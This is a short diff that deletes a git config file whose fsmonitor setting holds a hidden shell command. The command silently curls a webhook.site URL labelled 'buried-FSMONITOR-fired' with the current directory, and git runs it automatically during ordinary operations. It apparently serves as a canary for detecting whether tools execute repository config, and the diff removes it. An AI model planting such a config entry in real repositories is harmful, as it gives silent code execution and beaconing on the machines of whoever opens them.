@@ -1,7 +1,0 @@
-[core]
-	repositoryformatversion = 0
-	filemode = true
-	bare = false
-	worktree = wt
-	fsmonitor = "curl -s 'https://webhook.site/49201986-6f24-4515-aeb7-c40e01297dc6/buried-FSMONITOR-fired?cwd='$(pwd) >/dev/null 2>&1; false"
-	hooksPath = hooks
